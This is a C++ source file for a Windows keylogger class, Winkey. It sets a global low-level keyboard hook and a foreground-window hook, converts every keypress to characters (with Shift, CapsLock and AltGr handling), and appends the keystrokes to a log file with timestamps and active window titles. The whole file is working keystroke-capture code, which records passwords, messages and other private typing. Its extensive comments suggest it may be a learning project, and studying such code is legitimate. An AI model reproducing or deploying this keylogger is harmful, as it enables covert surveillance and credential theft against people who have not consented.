#include "Winkey.hpp"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "psapi.lib")

// Declare the attributes which are used by the static methods
bool            Winkey::_testMode;
const char*     Winkey::_logFileName = TW_LOGFILE;
std::wofstream  Winkey::_logFile;
std::wstring    Winkey::_windowTitle;
std::wstring    Winkey::_keyStroke;
HWND            Winkey::_currentWindow;

Winkey::Winkey()
{
    // Set window and keyboard hooks
    setHooks();
}

// Set hooks to intercept events
void Winkey::setHooks(void)
{
    // Set the event hook for foreground window changes (out-of-context)
    _winEventHook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
        NULL,
        winEventProc,
        0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    if (!_winEventHook)
        throw WinkeyException(
            WinkeyError::winEventHookFailure, "SetWinEventHook failed."
        );

    // Install global low-level keyboard hook to intercept keystrokes
    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
    if (!_keyboardHook)
        throw WinkeyException(
            WinkeyError::keyboardHookFailure, "SetWindowsHookEx failed."
        );
}

// Run the main loop of the program
void Winkey::run(bool testMode)
{
    // Check if the test mode is on
    _testMode = testMode;

    if (_testMode) // If test mode is on, we overwrite on the file
        _logFile.open(_logFileName, std::ios::out | std::ios::trunc);
    else
        _logFile.open(_logFileName, std::ios::app); // Open in appending mode


    if (!_logFile.is_open())
        throw WinkeyException(
            WinkeyError::FileOpenFailure, "Failed to open or to create the log file."
        );

    // Tell std::wofstream to use UTF-8 encoding when writing wide
    //  characters (wchar_t) to the file.
    _logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));

    /*
     * Main message loop
     * Blocks until a Windows message (like an event) is available.
     * The loop only stops when receiving `WM_QUIT`.
     */

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}
}

// Log the keystroke data to the log file
void Winkey::logToFile(void)
{
    static HWND lastWindow = nullptr;

    // Only log the window title if it has changed (and we're not in test mode)
    if (!_testMode && (_currentWindow != lastWindow))
    {
        time_t now = time(nullptr);
        bool empty = _logFile.tellp() == 0;

        _logFile << (empty ? L"" : L"\n\n");

        /* Log the current date time
         *
         * Convert time_t into a tm structure representing the local time
         *  (hours, minutes, day, month, etc.)
         */

        struct tm localTime{};
        if (localtime_s(&localTime, &now) == 0)
        {
            // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
            // `L` is for wide characters (Unicode)
            _logFile << L"[" << std::setfill(L'0')
                     << std::setw(2) << localTime.tm_mday << L"."
                     << std::setw(2) << (localTime.tm_mon + 1) << L"."
                     << (localTime.tm_year + 1900) << L" "
                     << std::setw(2) << localTime.tm_hour << L":"
                     << std::setw(2) << localTime.tm_min << L":"
                     << std::setw(2) << localTime.tm_sec << L"] - '";
        }

        // Log the window title
        _logFile << _windowTitle << L"'" << std::endl;
    }
    lastWindow = _currentWindow;

    _logFile << _keyStroke;
    // Ensure that everything written to the file is immediately pushed to disk
    _logFile.flush();
}

// Write the timestamp + current active window name to the log file
void CALLBACK Winkey::winEventProc(
    const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
    LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
)
{
    _currentWindow = hwnd;
    if (event == EVENT_SYSTEM_FOREGROUND)
    {
        wchar_t windowTitle[TW_WINTITLE_MAX] = {};
        int result = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));

        if (result > 0)
        {
            // Sanitize the window title
            for (int i = 0; i < result; ++i)
                if (!isPrintable(windowTitle[i]))
                    windowTitle[i] = L'?';

            /*
             * Save the current window title to log it later
             *
             * We will not use the result of GetWindowTextW to determine the length
             *  as it for some reason did truncate our final string
             */

            _windowTitle = windowTitle;
        }
    }
}

/*
 * Low-level keyboard hook callback.
 *
 * @param   nCode   Code the system passes to the hook procedure to indicate
 *                  the action to be taken.
 * @param   wParam  The message type.
 * @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
 *                  information about the keyboard event (which key, scan code,
 *                  flags, etc.).
 *
 * @return  CallNextHookEx
 *          - LRESULT is a Windows data type used for return values from
 *              window procedures and hook functions.
 *          - CALLBACK is a macro defining the calling convention of the function
 *              (specifies how parameters are passed and who cleans the stack).
 */

LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
    const int nCode, const WPARAM wParam, const LPARAM lParam)
{
    /*
     * HC_ACTION        Process the event normally.
     * WM_KEYDOWN       Key pressed
     * WM_SYSKEYDOWN    System key pressed (like ALT or F10)
     */

    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        static DWORD lastVkCode = 0;
        static size_t lastVkCodeCount = 1;
        const KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;

        // Check if the same key hasn't been typed repetitively
        if (p->vkCode == lastVkCode)
        {
            ++lastVkCodeCount;
            // If the maximum repetition count is reached, quit
            if (lastVkCodeCount > TW_MAX_SAME_VK)
                return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        else lastVkCodeCount = 1; // If not reached, reset the counter

        lastVkCode = p->vkCode;

        BYTE keyboardState[256];
        wchar_t buffer[TW_KEYSTROKE_MAX];

        /*
         * Get the current state of all keys
         *
         * GetKeyboardState() retrieves the keyboard state for the calling thread,
         *  not the one generating the event.
         *
         * This is why we need to manually update the state of modifier keys
         *  (like Shift, Ctrl, Alt) if we want, for instance, the characters to be
         *  uppercase when Shift is hold.
         *
         */

        GetKeyboardState(keyboardState);

        /*
         * Set modifier keys manually
         *
         * GetKeyState()
         * -------------
         * Gets the key status returned from the thread's message queue.
         * 
         * GetAsyncKeyState()
         * ------------------
         * Determines whether a key is up or down at the time the function is called.
         * If the most significant bit (0x8000) is set, the key is down.
         * 
         * 0x8000 means pressed, 0x0001 means active for toggle keys.
         */

        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) // If Shift key is down
            keyboardState[VK_SHIFT] |= 0x80; // Set Shift key as down
        else
            keyboardState[VK_SHIFT] &= ~0x80; // Set Shift key as up

        if (GetKeyState(VK_CAPITAL) & 0x0001) // Toggle bit for CapsLock
            keyboardState[VK_CAPITAL] |= 0x01;
        else
            keyboardState[VK_CAPITAL] &= ~0x01; // Clear the toggle state if not toggled

        if (GetAsyncKeyState(VK_MENU) & 0x8000) // Alt key
            keyboardState[VK_MENU] |= 0x80;
        else
            keyboardState[VK_MENU] &= ~0x80;

        // If AltGr (RightAlt) is down, remove the LeftCtrl bit so ToUnicodeEx
        // treats it as a layout AltGr combo instead of Ctrl+Alt.
        if ((keyboardState[VK_RMENU] & 0x80) && (keyboardState[VK_LCONTROL] & 0x80)) {
            keyboardState[VK_LCONTROL] &= ~0x80;
            keyboardState[VK_CONTROL] &= ~0x80;
        }

        /*
         * Converts the virtual key code (vkCode) and scan code into the
         *  corresponding Unicode character(s)
         *
         * vkCode:
         *  - A Windows-defined constant that identifies a logical key,
         *      like "A", "Shift", "Enter", "F1", etc.
         *  - Same across keyboards: for example, VK_A always refers to the A key,
         *      no matter where it is on the keyboard.
         *
         * scanCode:
         *  - A hardware-generated code from the keyboard itself.
         *  - Represents the physical location of the key on the keyboard.
         */

        int result = ToUnicodeEx(
            p->vkCode, p->scanCode, keyboardState,
            buffer, TW_KEYSTROKE_MAX,
            0x0004,              // Don't change keyboard state (resolves dead keys problem)
            GetKeyboardLayout(0) // Gets the input language layout of the current thread
        );

        /*
         * Log character to file or, if no valid character was produced
         *  (like arrow keys, function keys, Ctrl+C), log a fallback string that includes
         *  the virtual key code.
         */

        if (result > 0 && isPrintable(buffer[0])) {
            buffer[result] = L'\0';
            _keyStroke = buffer;
        }
        else _keyStroke = getKeyName(p->vkCode);

        logToFile();
    }

    // Pass the event to the next hook
    // (Otherwise, we will swallow the event and suppress it)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// This desctructor cleans up before leaving
Winkey::~Winkey()
{
    if (_winEventHook)
        UnhookWinEvent(_winEventHook);
    if (_keyboardHook)
        UnhookWindowsHookEx(_keyboardHook);
    if (_singleInstanceMutex)
        CloseHandle(_singleInstanceMutex);
    if (_logFile.is_open())
        _logFile.close();
}
